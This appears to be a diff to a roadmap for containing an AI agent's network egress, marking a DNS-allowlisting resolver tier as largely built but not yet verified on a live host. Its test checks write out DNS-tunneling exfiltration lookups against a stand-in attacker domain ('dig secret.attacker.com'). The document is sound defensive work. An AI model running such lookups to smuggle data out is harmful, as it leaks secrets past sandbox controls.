@@ -64,10 +64,27 @@ tracker as separate issues. None implemented yet.
           Tier A checks (raw-socket blocked, `example.com` fails, `api.github.com` works,
           `npm install`/`git fetch` unaffected). Deploy wiring (`deployment/vps`) to build
           the image is part of enabling.
-  - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
-        names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
-        the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
-        DNS-open reference; minimum tier that contains exfil.
+  - **Tier B** — controlled DNS resolver (dnsmasq) in the agent netns: forwards only
+    allowlisted domains (closes DNS tunneling — `dig secret.attacker.com` is refused) and
+    pins resolved IPs into the Tier A ipset (kills stale-IP breakage). Own flag
+    `SESSION_EGRESS_DNS=1` (requires `SESSION_EGRESS_ENFORCE=1`), default OFF.
+    - [x] Config generation (`egress-dns.ts` + test): per-domain `server=`/`ipset=`, no
+          default upstream, internal-names → Docker DNS, resolver `user=` for owner-match.
+    - [x] Resolver runner + image (`run-resolver.sh`, `dnsmasq` + `egressdns` uid 911 in
+          `Dockerfile.egress-sidecar`).
+    - [x] Installer DNS-lock rules (`init-firewall.sh`, gated on `EGRESS_DNS_RESOLVER_UID`):
+          block agent→Docker-DNS, allow only the resolver uid's upstream :53; DNS-independent
+          literal-IP self-test (works in both tiers).
+    - [x] Orchestrator wiring (`egress-dns-install.ts` + test): `buildResolverConfigB64`,
+          `launchEgressResolver` (long-lived sidecar in agent netns, labeled
+          `shipit-parent-session` so existing cleanup tears it down), agent `--dns 127.0.0.1`,
+          resolver-uid threaded to the installer; sequenced after the Tier A install.
+    - [ ] **Verify on a live host (expect a fix-cycle — riskier than Tier A):** the
+          #1 unknown is the `127.0.0.11` / Docker-embedded-DNS iptables interaction (DNAT
+          port rewrite) and internal-name resolution for the orchestrator host. Run the
+          extended SHI-90 Tier B checks: `dig data.attacker.com` → refused/empty,
+          `dig @8.8.8.8` → blocked, allowlisted names still resolve, and the session's own
+          control channel (worker→orchestrator) still works.
   - [ ] **Tier C** — transparent SNI/CONNECT proxy (reuse the matcher) for hostname-level
         HTTPS policy, the allow-once / add-to-allowlist inline card (deny-fast + retry,
         persisted), and the Phase-2 hook. **Removes** the `HTTP_PROXY`/`NO_PROXY` env
